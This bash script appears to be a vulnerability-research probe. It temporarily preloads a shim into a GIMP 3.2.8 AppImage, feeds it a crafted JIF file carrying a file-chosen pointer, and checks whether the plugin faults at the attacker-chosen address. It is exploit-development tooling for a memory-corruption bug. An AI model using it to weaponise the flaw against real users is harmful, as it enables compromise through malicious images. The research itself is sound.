#!/usr/bin/env bash
# W301 bounded live probe: feed published-ptr.jif (file-chosen pointer at
# out+280) through the real GIMP 3.2.8 PDB path with repair-shim.so, which
# restores only the collateral chunk-size and object-first words after
# inflate.  Look for a live fault at the chosen address.  No plugin source
# is modified; the shim is a temporary LD_PRELOAD and AppRun is restored.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
[ -x "$ROOT/AppRun" ] || { echo "extracted AppImage missing" >&2; exit 1; }
[ -f "$BASE/realglib/evidence/published-ptr.jif" ] \
  || { echo "published-ptr.jif missing" >&2; exit 1; }

gcc -shared -fPIC -O2 -o "$HERE/repair-shim.so" "$HERE/repair-shim.c" -ldl \
  && ok "collateral-repair shim built" || no "repair shim build"

cp "$ROOT/AppRun" "$ROOT/AppRun.w301-backup"
ARPATCH="$ROOT/AppRun.w301-new"
INSERTED=0
: > "$ARPATCH"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *inflate-shim.so*|*patch-shim.so*|*consumer-raw.so*|*consumer-patch.so*|*repair-shim.so*) continue ;;
    exec*org.gimp.GIMP.Stable*)
      if [ "$INSERTED" -eq 0 ]; then
        printf 'export LD_PRELOAD="$LD_PRELOAD:%s"\n' "$HERE/repair-shim.so" >> "$ARPATCH"
        INSERTED=1
      fi
      ;;
  esac
  printf '%s\n' "$line" >> "$ARPATCH"
done < "$ROOT/AppRun.w301-backup"
[ "$INSERTED" -eq 1 ] || { echo "AppRun exec line not found" >&2; exit 1; }
mv "$ARPATCH" "$ROOT/AppRun"
chmod +x "$ROOT/AppRun"
ok "AppRun temporarily patched to preload repair shim"

run_jif () {
  local file="$1" out="$2" rc=0
  local home; home="$(mktemp -d /tmp/gimpjif-repairhome-XXXXXX)"
  (cd "$ROOT" && exec setsid timeout -k 5 90 env HOME="$home" ./AppRun -i \
      --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 &
  runpid=$!
  wait "$runpid" || rc=$?
  echo "RUN_RC=$rc" >> "$out"
  # The plug-in and script-fu children outlive the main AppRun; kill their
  # whole session so none holds the wake cgroup. Scoped to this run only.
  kill -9 -- "-$runpid" 2>/dev/null || true
}

run_jif "$BASE/realglib/evidence/safe.jif" \
  "$EVID/appimage-repair-safe.log"
run_jif "$BASE/realglib/evidence/published-ptr.jif" \
  "$EVID/appimage-repair-ptr.log"

# Restore the pre-probe AppRun before reporting anything.
cp "$ROOT/AppRun.w301-backup" "$ROOT/AppRun"
chmod +x "$ROOT/AppRun"
ok "AppRun preload line restored"

! grep -q '^REPAIR_ARMED ' "$EVID/appimage-repair-safe.log" \
  && ok "safe 4x4 input makes no repair call" || no "safe repair control"
grep -q '^REPAIR_PATCHED pid=' "$EVID/appimage-repair-ptr.log" \
  && ok "file-chosen pointer run reached the post-inflate repair" \
  || no "attack repair call"
grep -q 'REPAIR_WORD_AFTER=2100000000000000010000000000000043424100007f0000' \
  "$EVID/appimage-repair-ptr.log" \
  && ok "chosen pointer preserved at out+280 after repair" \
  || echo "UNKNOWN: chosen pointer word not as predicted at out+280"
if grep -q '^REPAIR_FAULT ' "$EVID/appimage-repair-ptr.log"; then
  grep -q 'REPAIR_FAULT .* chosen=1 ' "$EVID/appimage-repair-ptr.log" \
    && ok "live plugin faulted at the file-chosen address" \
    || echo "UNKNOWN: fault at another address, see log"
else
  echo "UNKNOWN: no fault observed in the live plugin window"
fi

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
